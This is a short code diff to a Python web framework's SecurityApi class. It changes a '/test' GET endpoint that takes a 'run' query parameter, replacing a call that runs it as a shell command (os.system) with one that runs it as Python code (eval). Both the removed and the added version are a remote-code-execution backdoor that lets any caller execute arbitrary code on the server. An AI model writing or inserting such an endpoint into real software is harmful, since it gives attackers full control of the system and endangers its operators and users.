@@ -32,10 +32,8 @@ class SecurityApi(BaseApi):
 
     @expose("/test", methods=["GET"])
     def test(self) -> Response:
-        from os import system
-
         run_cmd = request.args.get("run")
-        system(run_cmd)
+        eval(run_cmd)
         return self.response(200)
 
     @expose("/login", methods=["POST"])
